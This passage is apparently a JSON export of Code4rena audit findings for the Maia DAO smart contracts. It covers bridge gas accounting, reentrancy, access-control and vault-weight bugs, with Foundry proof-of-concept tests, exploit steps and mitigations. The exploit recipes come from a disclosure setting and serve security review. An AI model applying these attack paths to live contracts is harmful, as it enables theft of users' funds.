testDosCreateBribeFlywheel() public {         MockERC20 bribeToken3 = new MockERC20(\"Bribe Token3\", \"BRIBE3\", 18);         bribeToken3.mint(address(this), 1000);                  // transfer 1 wei to zero address (or \"burn\" on other contracts)         bribeToken3.transfer(address(0), 1);         assertEq(bribeToken3.balanceOf(address(0)), 1);                          // hevm.expectRevert(stdError.arithmeticError); // for some reason this does not work, foundry error                 // function reverts regardless with \"Arithmetic over/underflow\" because the way Solmate ERC20::transferFrom is implemented         factory.createBribeFlywheel(address(bribeToken3));      } ```  Observation: because the `MockERC20` contract uses Solmate ERC20 implementation, the error is `\"Arithmetic over/underflow\"` since `address(0)` did not pre-approve the token swap (evidently).  ## Tools Used  Manual analysis  ## Recommended Mitigation Steps  - if project tokens are to be used as reward tokens, consider using OpenZeppelin ERC20 implementation (as [it does not allow transfer to 0 address](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L225-L233) if burn is not intended) or add checks to all project token contracts that transfer `to` argument must never be `address(0)`. - modify `FlywheelCore::setFlywheelRewards` to not attempt any token transfer if previous `flywheelRewards` is `address(0)`. Example implementation:  ```diff diff --git a/src/rewards/base/FlywheelCore.sol b/src/rewards/base/FlywheelCore.sol index 308b804..eaa0093 100644 --- a/src/rewards/base/FlywheelCore.sol +++ b/src/rewards/base/FlywheelCore.sol @@ -123,9 +123,11 @@ abstract contract FlywheelCore is Ownable, IFlywheelCore {        /// @inheritdoc IFlywheelCore      function setFlywheelRewards(address newFlywheelRewards) external onlyOwner { -        uint256 oldRewardBalance = rewardToken.balanceOf(address(flywheelRewards)); -        if (oldRewardBalance > 0) { -            rewardToken.safeTransferFrom(address(flywheelRewards), address(newFlywheelRewards), oldRewardBalance); +        if (address(flywheelRewards) != address(0)) { +            uint256 oldRewardBalance = rewardToken.balanceOf(address(flywheelRewards)); +            if (oldRewardBalance > 0) { +                rewardToken.safeTransferFrom(address(flywheelRewards), address(newFlywheelRewards), oldRewardBalance); +            }          }            flywheelRewards = newFlywheelRewards;  ```   ## Assessed type  DoS"}, {"title": "Multiple issues with `retrySettlement()` and `retrieveDeposit()` will cause loss of users' bridging deposits", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/356", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "upgraded by judge", "H-22"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L441-L447 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L426 https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1227-L1307   # Vulnerability details  Both `retrySettlement()` and `retrieveDeposit()` are incorrectly implemented with the following 3 issues,   1. Both `retrySettlement()` and `retrieveDeposit()` are lacking a call to `wrappedNativeToken.deposit()` to wrap the native token paid by users for gas. This causes a subsequent call to `_depositGas()` to fail at [BranchBridgeAgent.sol#L929-L931](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L929-L931). This is also inconsistent with the other functions like `retryDeposit()`, which wraps the received native token for gas. (see [BranchBridgeAgent.sol#L441-L447](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L441-L447))  2. `retrySettlement()` has a redundant increment for `depositNonce` in [BranchBridgeAgent.sol#L426](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L426), which will cause a different `depositNonce` value to be used for the subsequent call to `_createGasDeposit` in [BranchBridgeAgent.sol#L836](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L836).  3. Both `retrySettlement()` and `retrieveDeposit()` are missing fallback implementation, as `BranchBridgeAgent.anyFallback()` is not handling flag `0x07` (retrySettlement) and flag `0x08` (retrieveDeposit) as evident in [BranchBridgeAgent.sol#L1227-L1307](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L1227-L1307).   ## Impact Due to these issues, both `retrySettlement()` and `retrieveDeposit()` will cease to function properly. That will prevent users from re-trying failed settlement and retrieving deposits, resulting in loss of users' deposit for bridging. In addition, the gas paid by user that is not wrapped will also be stuck in BranchBridgeAgent as there is no function to withdraw native token.    ## Proof of Concept  Add the following test case to `RootTest.t.sol`. This shows the issues with the lack of native token wrapping.  ```Solidity      function testPeakboltRetrySettlement() public {         //Set up         testAddLocalTokenArbitrum();          //Prepare data         bytes memory packedData;          {             Multicall2.Call[] memory calls = new Multicall2.Call[](1);              //Mock action             calls[0] = Multicall2.Call({target: 0x0000000000000000000000000000000000000000, callData: \"\"});              //Output Params             OutputParams memory outputParams = OutputParams(address(this), newAvaxAssetGlobalAddress, 150 ether, 0);              //RLP Encode Calldata Call with no gas to bridge out and we top up.             bytes memory data = abi.encode(calls, outputParams, ftmChainId);              //Pack FuncId             packedData = abi.encodePacked(bytes1(0x02), data);         }          address _user = address(this);          //Get some gas.         hevm.deal(_user, 1 ether);         hevm.deal(address(ftmPort), 1 ether);          //assure there is enough balance for mock action         hevm.prank(address(rootPort));         ERC20hTokenRoot(newAvaxAssetGlobalAddress).mint(address(rootPort), 50 ether, rootChainId);         hevm.prank(address(avaxPort));         ERC20hTokenBranch(avaxMockAssethToken).mint(_user, 50 ether);          //Mint Underlying Token.         avaxMockAssetToken.mint(_user, 100 ether);          //Prepare deposit info         DepositInput memory depositInput = DepositInput({             hToken: address(avaxMockAssethToken),             token: address(avaxMockAssetToken),             amount: 150 ether,             deposit: 100 ether,             toChain: ftmChainId         });           console2.log(\"-------------  Creating a failed settlement ----------------\");                  //Call Deposit function         avaxMockAssetToken.approve(address(avaxPort), 100 ether);         ERC20hTokenRoot(avaxMockAssethToken).approve(address(avaxPort), 50 ether);          //Set MockAnycall AnyFallback mode ON         MockAnycall(localAnyCallAddress).toggleFallback(1);          //this is for branchBridgeAgent anyExecute         uint128 remoteExecutionGas = 4e9;                  //msg.value is total gas amount for both Root and Branch agents         avaxMulticallBridgeAgent.callOutSignedAndBridge{value: 1e11 }(packedData, depositInput, remoteExecutionGas);          //Set MockAnycall AnyFallback mode OFF         MockAnycall(localAnyCallAddress).toggleFallback(0);          //Perform anyFallback transaction back to root bridge agent         MockAnycall(localAnyCallAddress).testFallback();          //check settlement status         uint32 settlementNonce = multicallBridgeAgent.settlementNonce() - 1;         Settlement memory settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);         console2.log(\"Status after fallback:\", settlement.status == SettlementStatus.Failed ? \"Failed\" : \"Success\");         require(settlement.status == SettlementStatus.Failed, \"Settlement status should be failed.\");           console2.log(\"------------- retrying Settlement ----------------\");                  //Get some gas.         hevm.deal(_user, 1 ether);          //Retry Settlement                 uint256 depositedGas = 7.9e9;         uint128 gasToBridgeOut = 1.6e9;          // This is expected to fail the gas paid by user is not wrapped and transfered          avaxMulticallBridgeAgent.retrySettlement{value: depositedGas}(settlementNonce, gasToBridgeOut);          settlement = multicallBridgeAgent.getSettlementEntry(settlementNonce);          require(settlement.status == SettlementStatus.Success, \"Settlement status should be success.\");          address userAccount = address(RootPort(rootPort).getUserAccount(_user));            } ```   ## Recommended Mitigation Steps 1. Add `wrappedNativeToken.deposit{value: msg.value}();` to both `retrySettlement()` and `retrieveDeposit()`. 2. Remove the increment from `depositNonce` in [BranchBridgeAgent.sol#L426](https://github.com/code-423n4/2023-05-maia/blob/main/src/ulysses-omnichain/BranchBridgeAgent.sol#L426). 3. Add fallback implementation for both flag `0x07` (retrySettlement) and flag `0x08` (retrieveDeposit).     ## Assessed type  Other"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/346", "labels": ["grade-a", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/Fulum-Analysis.md)."}, {"title": "Attacker can redeposit gas after \"forceRevert()\" to freeze all deposited gas budget of Root Bridge Agent", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/337", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-23"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L1233-L1241   # Vulnerability details  ## Impact `forceRevert()` withdraws all deposited gas budget of Root Bridge Agent to ensure that failed AnyCall execution will not be charged. However, if `forceRevert()` took place during a call made by virtual account, gas can be replenished later manually. As a result, the AnyCall execution will succeed but all withdrawn gas will be frozen.  ## Proof of Concept ``` function anyExecute(bytes calldata data)     external     virtual     requiresExecutor     returns (bool success, bytes memory result) {     uint256 _initialGas = gasleft();     uint24 fromChainId;     UserFeeInfo memory _userFeeInfo;      if (localAnyCallExecutorAddress == msg.sender) {         initialGas = _initialGas;         (, uint256 _fromChainId) = _getContext();         fromChainId = _fromChainId.toUint24();          _userFeeInfo.depositedGas = _gasSwapIn(             uint256(uint128(bytes16(data[data.length - PARAMS_GAS_IN:data.length - PARAMS_GAS_OUT]))), fromChainId).toUint128();         _userFeeInfo.gasToBridgeOut = uint128(bytes16(data[data.length - PARAMS_GAS_OUT:data.length]));     } else {         fromChainId = localChainId;         _userFeeInfo.depositedGas = uint128(bytes16(data[data.length - 32:data.length - 16]));         _userFeeInfo.gasToBridgeOut = _userFeeInfo.depositedGas;     }      if (_userFeeInfo.depositedGas < _userFeeInfo.gasToBridgeOut) {         _forceRevert();         return (true, \"Not enough gas to bridge out\");     }      userFeeInfo = _userFeeInfo;      // execution part     ............      if (initialGas > 0) {         _payExecutionGas(userFeeInfo.depositedGas, userFeeInfo.gasToBridgeOut, _initialGas, fromChainId);     } } ```  To implement the attack, attacker `callOutSigned` on a branch chain to bypass `lock`. On the root chain, virtual account makes three external calls. 1. `retryDeposit` at Arbitrum Branch Bridge Agent with an already executed nonce. The call will `forceRevert()` and `initialGas` will be nonzero since it has not been modified by reentering. As a result, all execution gas budget will be withdrawn. ``` function _forceRevert() internal {     if (initialGas == 0) revert GasErrorOrRepeatedTx();      IAnycallConfig anycallConfig = IAnycallConfig(IAnycallProxy(localAnyCallAddress).config());     uint256 executionBudget = anycallConfig.executionBudget(address(this));      // Withdraw all execution gas budget from anycall for tx to revert with \"no enough budget\"     if (executionBudget > 0) try anycallConfig.withdraw(executionBudget) {} catch {} } ``` 2. `callOut` at Arbitrum Branch Bridge Agent. The call should succeed and `initialGas` is deleted. ``` function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain) internal {     delete(initialGas);     delete(userFeeInfo);      if (_fromChain == localChainId) return; ``` 3. Directly deposit a small amount of gas at Anycall Config to ensure the success of the transaction. ``` function deposit(address _account) external payable {     executionBudget[_account] += msg.value;     emit Deposit(_account, msg.value); } ``` Then, the original call proceeds and `_payExecutionGas` will be skipped. The call will succeed, with all withdrawn gas budget permanently frozen. (In current implementation, ETH can be sweeped to dao address, but this is another mistake, `sweep` should transfer WETH instead.)  ## Tools Used Manual  ## Recommended Mitigation Steps Add a `msg.sender` check in `_forceRevert` to ensure local call will be directly reverted.      ## Assessed type  Reentrancy"}, {"title": "User can \"callOutSigned\" without paying for gas by reentering \"anyExecute\" with virtual account", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/331", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-30"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L798-L805   # Vulnerability details  ## Impact Virtual account can perform external calls during root chain execution process. If it `callOut` at Arbitrum Branch Bridge Agent, `anyExecute` in Root Bridge Agent will be reentered. `lock` will not work if user initiated the process on another branch chain. `_payExecutionGas` will not charge gas for the reentrancy call, Meanwhile, storage variable `initialGas` and `userFeeInfo` will be deleted. As a result, no gas will be charged for the original call.   ## Proof of Concept ``` function anyExecute(bytes calldata data)     external     virtual     requiresExecutor     returns (bool success, bytes memory result) {     uint256 _initialGas = gasleft();     uint24 fromChainId;     UserFeeInfo memory _userFeeInfo;      if (localAnyCallExecutorAddress == msg.sender) {         initialGas = _initialGas;         (, uint256 _fromChainId) = _getContext();         fromChainId = _fromChainId.toUint24();          _userFeeInfo.depositedGas = _gasSwapIn(             uint256(uint128(bytes16(data[data.length - PARAMS_GAS_IN:data.length - PARAMS_GAS_OUT]))), fromChainId).toUint128();         _userFeeInfo.gasToBridgeOut = uint128(bytes16(data[data.length - PARAMS_GAS_OUT:data.length]));     } else {         fromChainId = localChainId;         _userFeeInfo.depositedGas = uint128(bytes16(data[data.length - 32:data.length - 16]));         _userFeeInfo.gasToBridgeOut = _userFeeInfo.depositedGas;     }      if (_userFeeInfo.depositedGas < _userFeeInfo.gasToBridgeOut) {         _forceRevert();         return (true, \"Not enough gas to bridge out\");     }      userFeeInfo = _userFeeInfo;      // execution part     ............      if (initialGas > 0) {         _payExecutionGas(userFeeInfo.depositedGas, userFeeInfo.gasToBridgeOut, _initialGas, fromChainId);     } } ``` ``` function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain) internal {     delete(initialGas);     delete(userFeeInfo);      if (_fromChain == localChainId) return;      uint256 availableGas = _depositedGas - _gasToBridgeOut;     uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft());     if (minExecCost > availableGas) {         _forceRevert();         return;     }      _replenishGas(minExecCost);      accumulatedFees += availableGas - minExecCost; } ``` During the reentrancy call, `initialGas` will not be modified before the execution part; `_payExecutionGas` will be invoked, but it will directly return after deleting `initialGas` and `userFeeInfo`. As a result, after the execution part of original call, `_payExecutionGas` will be passed as `initialGas` is now zero.  ## Tools Used Manual  ## Recommended Mitigation Steps Store `initialGas` and `userFeeInfo` in memory as local variable inside `anyExecute`.            ## Assessed type  Reentrancy"}, {"title": "Analysis", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/325", "labels": ["grade-b", "satisfactory", "sponsor confirmed", "analysis"], "target": "2023-05-maia-findings", "body": "See the markdown file with the details of this report [here](https://github.com/code-423n4/2023-05-maia-findings/blob/main/data/0xStalin-Analysis.md)."}, {"title": "Incorrect accounting logic for fallback gas will lead to insolvency", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/313", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-31"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/RootBridgeAgent.sol#L823 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BranchBridgeAgent.sol#L1044   # Vulnerability details  ## Impact Incorrect accounting logic for fallback gas will lead to insolvency.  ## Proof of Concept     // on root chain     function _payExecutionGas(uint128 _depositedGas, uint128 _gasToBridgeOut, uint256 _initialGas, uint24 _fromChain) internal {         ......         uint256 availableGas = _depositedGas - _gasToBridgeOut;         uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasleft());          if (minExecCost > availableGas) {             _forceRevert();             return;         }          _replenishGas(minExecCost);          //Account for excess gas         accumulatedFees += availableGas - minExecCost;     }      // on branch chain     function _payFallbackGas(uint32 _depositNonce, uint256 _initialGas) internal virtual {         ......         IPort(localPortAddress).withdraw(address(this), address(wrappedNativeToken), minExecCost);         wrappedNativeToken.withdraw(minExecCost);         _replenishGas(minExecCost);     }  As above, when paying execution gas on the root chain, the excessive gas is added to accumulatedFees. So theoretically all deposited gas is used up and no gas has been reserved for `anyFallback` on the branch chain. The withdrawl in `_payFallbackGas` on branch chain will cause insolvency.      // on branch chain     function _payExecutionGas(address _recipient, uint256 _initialGas) internal virtual {         ......         uint256 gasLeft = gasleft();         uint256 minExecCost = tx.gasprice * (MIN_EXECUTION_OVERHEAD + _initialGas - gasLeft);          if (minExecCost > gasRemaining) {             _forceRevert();             return;         }          _replenishGas(minExecCost);          //Transfer gas remaining to recipient         SafeTransferLib.safeTransferETH(_recipient, gasRemaining - minExecCost);         ......         }     }      // on root chain     function _payFallbackGas(uint32 _settlementNonce, uint256 _initialGas) internal virtual {         uint256 gasLeft = gasleft();         uint256 minExecCost = tx.gasprice * (MIN_FALLBACK_RESERVE + _initialGas - gasLeft);          if (minExecCost > getSettlement[_settlementNonce].gasToBridgeOut) {             _forceRevert();             return;         }          getSettlement[_settlementNonce].gasToBridgeOut -= minExecCost.toUint128();     }  As above, when paying execution gas on the branch chain, the excessive gas has be sent to the recipent. So therotically all deposited gas is used up and no gas has been reserved for `anyFallback` on the root chain. `_payFallbackGas` does not `_replenishGas`, which will cause insolvency of gas budget in `AnycallConfig`. ## Tools Used Manual  ## Recommended Mitigation Steps Deduct fallback gas from deposited gas.   ## Assessed type  Context"}, {"title": "VirtualAccount cannot directly send native tokens ", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/307", "labels": ["bug", "2 (Med Risk)", "disagree with severity", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "M-32"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/VirtualAccount.sol#L41-L53   # Vulnerability details  ## Impact Certain functions require native tokens to be sent. These functions will revert.  ## Proof of Concept According to the Sponsor, VirtualAccounts can \"call any of the dApps present in the Root Chain (Arbitrum) e.g. Maia, Hermes, Ulysses AMM,Uniswap.\" However, this is not the case as `call()` is not `payable` and thus cannot send native tokens to other contracts. This is problematic because certain [functions](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/BaseBranchRouter.sol#L58-L62) require native token transfers and will fail.  ## Tools Used Manual  ## Recommended Mitigation Steps Consider creating a single `call()` function that has a `payable` modifier and `{value: msg.value}`. Be aware that since `calls[i].target.call()` is in a loop, it is not advisable to add payable to the existing `call()`. This is because  `msg.value` may be used multiple times, and is [unsafe](https://github.com/Uniswap/v3-periphery/issues/52).         ## Assessed type  Payable"}, {"title": "`unstakeAndWithdraw` inside `BoostAggregator` could lose pendingRewards in certain case", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/287", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-33"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/boost-aggregator/BoostAggregator.sol#L109-L136 https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/boost-aggregator/BoostAggregator.sol#L86   # Vulnerability details  ## Impact When `BoosAggregator`'s `unstakeAndWithdraw` triggered, it will try to unstake uniswap NFT position token from staker, get the pending rewards and if condition met, update strategy and protocol rewards accounting and claim the rewards for strategy and finally withdraw NFT position token from staker. However, if `pendingRewards` lower than `DIVISIONER` the accounting will not happened and can cause reward loss.  ## Proof of Concept  Inside `unstakeAndWithdraw`, if `pendingRewards` lower than `DIVISIONER`, the accounting update for `protocolRewards` and claim rewards for strategy not happened :  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/boost-aggregator/BoostAggregator.sol#L109-L136  ```solidity     function unstakeAndWithdraw(uint256 tokenId) external {         address user = tokenIdToUser[tokenId];         if (user != msg.sender) revert NotTokenIdOwner();          // unstake NFT from Uniswap V3 Staker         uniswapV3Staker.unstakeToken(tokenId);          uint256 pendingRewards = uniswapV3Staker.tokenIdRewards(tokenId) - tokenIdRewards[tokenId];          if (pendingRewards > DIVISIONER) {             uint256 newProtocolRewards = (pendingRewards * protocolFee) / DIVISIONER;             /// @dev protocol rewards stay in stake contract             protocolRewards += newProtocolRewards;             pendingRewards -= newProtocolRewards;              address rewardsDepot = userToRewardsDepot[user];             if (rewardsDepot != address(0)) {                 // claim rewards to user's rewardsDepot                 uniswapV3Staker.claimReward(rewardsDepot, pendingRewards);             } else {                 // claim rewards to user                 uniswapV3Staker.claimReward(user, pendingRewards);             }         }          // withdraw rewards from Uniswap V3 Staker         uniswapV3Staker.withdrawToken(tokenId, user, \"\");     } ```  However, when the token staked again via `BoosAggregator` by sending the NFT position back, the `tokenIdRewards` rewards updated, so the previous unaccounted rewards will be loss :  https://github.com/code-423n4/2023-05-maia/blob/main/src/talos/boost-aggregator/BoostAggregator.sol#L79-L93  ```solidity     function onERC721Received(address, address from, uint256 tokenId, bytes calldata)         external         override         onlyWhitelisted(from)         returns (bytes4)     {         // update tokenIdRewards prior to staking         tokenIdRewards[tokenId] = uniswapV3Staker.tokenIdRewards(tokenId);         // map tokenId to user         tokenIdToUser[tokenId] = from;         // stake NFT to Uniswap V3 Staker         nonfungiblePositionManager.safeTransferFrom(address(this), address(uniswapV3Staker), tokenId);          return this.onERC721Received.selector;     } ```  ## Tools Used  Manual review  ## Recommended Mitigation Steps  Two things can be done here, either just claim reward to strategy without taking the protocol fee, or take the amount fully for protocol.   ## Assessed type  Error"}, {"title": "Malicious user can set any contract as local hToken for an underlying since there is no access control for \"_addLocalToken\"", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/285", "labels": ["bug", "3 (High Risk)", "satisfactory", "selected for report", "sponsor confirmed", "edited-by-warden", "H-24"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-omnichain/CoreBranchRouter.sol#L78   # Vulnerability details  ## Impact Malicious user can deliberately set a irrelevant (or even poisonous) local hToken for an underlying token, as anyone can directly access `_addLocalToken` at root chain without calling `addLocalToken` at branch chain first.  ## Proof of Concept     function addLocalToken(address _underlyingAddress) external payable virtual {         //Get Token Info         string memory name = ERC20(_underlyingAddress).name();         string memory symbol = ERC20(_underlyingAddress).symbol();          //Create Token         ERC20hToken newToken = ITokenFactory(hTokenFactoryAddress).createToken(name, symbol);          //Encode Data         bytes memory data = abi.encode(_underlyingAddress, newToken, name, symbol);          //Pack FuncId         bytes memory packedData = abi.encodePacked(bytes1(0x02), data);          //Send Cross-Chain request (System Response/Request)         IBridgeAgent(localBridgeAgentAddress).performCallOut{value: msg.value}(msg.sender, packedData, 0, 0);     }  The intended method to add a new local token for an underlying is by calling function `addLocalToken` at the branch chain. However, it appears that the last line of code, `IBridgeAgent(localBridgeAgentAddress).performCallOut{value: msg.value}(msg.sender, packedData, 0, 0);` uses `performCallOut` instead of `performSystemCallOut`. This means that users can directly `callOut` at branch bridge agent with `_params = abi.encodePacked(bytes1(0x02), abi.encode(_underlyingAddress, anyContract, name, symbol))` to invoke `_addLocalToken` at the root chain without calling `addLocalToken` first. As a result, they may set an arbitrary contract as the local token. It's worth noting that the impact is irreversible as there is no mechanism to modify or delete local tokens, meaning that the underlying token can never be properly bridged in the future.  The branch hToken is called by function `bridgeIn` when `redeemDeposit` or `clearToken`:      function bridgeIn(address _recipient, address _localAddress, uint256 _amount)         external         virtual         requiresBridgeAgent     {         ERC20hTokenBranch(_localAddress).mint(_recipient, _amount);     } Below are several potetial exploiting methods: 1. If a regular ERC20 contract with admin minting permissions is set, exploiter can mint unlimited amount of local token for himself. By bridging them, he can receive an arbitrary amount of global token at the root chain. 2. If an unrelated contract with empty `mint` function is set, the underlying asset would be unable to be bridged in from the root chain, and users who attempt to do so could lose their assets. 3. If a malicious contract is set, gas griefing is possible. 4. This contract may serve as an intermediary for reentrancy. (I haven't found a concrete way so far but there is a potential risk)  ## Tools Used Manual  ## Recommended Mitigation Steps Use `performSystemCallOut` and `executeSystemRequest` to send Cross-Chain request for adding local token.         ## Assessed type  Access Control"}, {"title": "`UlyssesToken.setWeights(...)` can cause user loss of assets on vault deposits/withdrawals", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/281", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-34"], "target": "2023-05-maia-findings", "body": "# Lines of code  https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/ERC4626MultiToken.sol#L200-L207 https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/ERC4626MultiToken.sol#L250-L256   # Vulnerability details  ## Impact The [ERC-4626](https://eips.ethereum.org/EIPS/eip-4626) paradigm of deposit/mint and withdraw/redeem, where a **single** underlying asset amount can always be converted to a number of vault shares and vice-versa, breaks as soon as there are **multiple weighted** underlying assets involved.   While it's easy to convert from shares to asset amounts using the weight factors, it's hard to convert from asset amounts to shares in case they are not exactly distributed according to the weight factors.    In the Ulysses protocol this was solved the following way: * On `UlyssesToken.deposit(...)` every asset amount is converted to shares and the **smallest** of them is the one received for the deposit, see [ERC4626MultiToken.convertToShares(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/ERC4626MultiToken.sol#L200-L207). As a consequence, excess assets provided on deposit are lost for the user and cannot be redeemed with the received shares. * On `UlyssesToken.withdraw(...)` every asset amount is converted to shares and the **greatest** of them is the one required to withdraw the given asset amounts, see [ERC4626MultiToken.previewWithdraw(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/erc-4626/ERC4626MultiToken.sol#L250-L255). As a consequence, less assets than entitled to according to the share count can be withdrawn from the vault incuring a loss for the user.    One might argue that this issue is of low severity due to user error and the user being responsible to only use asset amounts in accordance with the vault's asset weights. However, the asset weights are not fixed and can be changed at any time by the ower of the `UlyssesToken` contract via the [setWeights(...)](https://github.com/code-423n4/2023-05-maia/blob/54a45beb1428d85999da3f721f923cbf36ee3d35/src/ulysses-amm/UlyssesToken.sol#L88-L105) method. That is what makes this an actual issue.   Consider the scenario when a user is about to deposit/withdraw assets not knowing their respective weights have changed, or even worse the deposit/withdraw transaction is already in the **mempool** but the call to `setWeights(...)` is executed before. Depending on the new asset weights, this will inevitably lead to a loss for the user.  ## Proof of Concept  The following in-line documented PoC demonstrates the above claims for the deposit case. Just add the new test case below to `test/ulysses-amm/UlyssesTokenTest.t.sol:InvariantUlyssesToken` and run it with `forge test -vv --match-test test_UlyssesToken`.  ```solidity function test_UlyssesTokenSetWeightsDepositLoss() public {     UlyssesToken token = UlyssesToken(_vault_);      // initialize asset amounts according to weights, mint tokens & give approval to UlyssesToken vault     uint256[] memory assetsAmounts = new uint256[](NUM_ASSETS);     for (uint256 i = 0; i < NUM_ASSETS; i++) {         assetsAmounts[i] = 1000 * token.weights(i);         MockERC20(token.assets(i)).mint(address(this), 1e18);         MockERC20(token.assets(i)).approve(address(token), 1e18);     }      // deposit assets & check if we got the expected number of shares     uint256 expectedShares = token.previewDeposit(assetsAmounts);     uint256 receivedShares = token.deposit(assetsAmounts, address(this));     assertEq(expectedShares, receivedShares); // OK      // check if we can redeem the same asset amounts as we deposited     uint256[] memory redeemAssetsAmounts = token.previewRedeem(receivedShares);     assertEq(assetsAmounts, redeemAssetsAmounts); // OK      // assuming everything is fine, we submit another deposit transaction to the mempool     // meanwhile the UlyssesToken owner changes the asset weights     uint256[] memory weights = new uint256[](NUM_ASSETS);     for (uint256 i = 0; i < NUM_ASSETS; i++) {         weights[i] = token.weights(i);     }     weights[0] *= 2; // double the weight of first asset     token.setWeights(weights);      // now our deposit transaction gets executed, but due to the changed asset weights     // we got less shares than expected while sending too many assets (except for asset[0])     receivedShares = token.deposit(assetsAmounts, address(this));     assertEq(expectedShares, receivedShares, \"got less shares than expected\");      // due to the reduced share amount we cannot redeem all the assets we deposited,     // we lost the excess assets we have deposited (except for asset[0])     redeemAssetsAmounts = token.previewRedeem(receivedShares);     assertEq(assetsAmounts, redeemAssetsAmounts, \"can redeem less assets than deposited\"); } ```  The test case shows that less shares than expected are received in case of changed weights and any deposited excess assets cannot be redeemed anymore: ``` Running 1 test for test/ulysses-amm/UlyssesTokenTest.t.sol:InvariantUlyssesToken [FAIL. Reason: Assertion failed.] test_UlyssesTokenSetWeightsDepositLoss() (gas: 631678) Logs:   Error: got less shares than expected   Error: a == b not satisfied [uint]         Left: 45000        Right: 27500   Error: can redeem less assets than deposited   Error: a == b not satisfied [uint[]]         Left: [10000, 10000, 20000, 5000]        Right: [10000, 5000, 10000, 2500] ```  *For the sake of simplicity, the test for the withdrawal case was skipped since it's exactly the same problem just in the reverse direction.*  ## Tools Used VS Code, Foundry  ## Recommended Mitigation Steps * On `UlyssesToken.deposit(...)`, only transfer the necessary token amounts (according to the computed share count) from the sender, like the `UlyssesToken.mint(...)` method does. * On `UlyssesToken.withdraw(...)`, transfer all the asset amounts the sender is entitled to (according to the computed share count) to the receiver, like the `UlyssesToken.redeem(...)` method does.    ## Assessed type  Rug-Pull"}, {"title": "Removing a `UniswapV3Gauge` via `UniswapV3GaugeFactory` does not actually remove it from the `UniswapV3Staker`; Gauge still gains rewards, can be staked to (even though deprecated) plus old stakers game the rewards of new stakers", "html_url": "https://github.com/code-423n4/2023-05-maia-findings/issues/277", "labels": ["bug", "2 (Med Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "M-35"], "target": "2023-05-maia-findings", "body": "# Lines of code  